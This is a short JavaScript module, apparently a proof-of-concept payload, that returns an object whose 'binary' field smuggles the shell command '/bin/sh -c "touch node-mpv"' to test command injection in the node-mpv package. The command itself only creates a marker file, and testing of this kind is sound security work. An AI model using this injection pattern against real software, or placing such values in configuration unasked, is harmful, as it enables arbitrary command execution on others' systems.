function getPayload() {
    return {
        binary: '/bin/sh -c "touch node-mpv"'
    };
}

module.exports = { getPayload };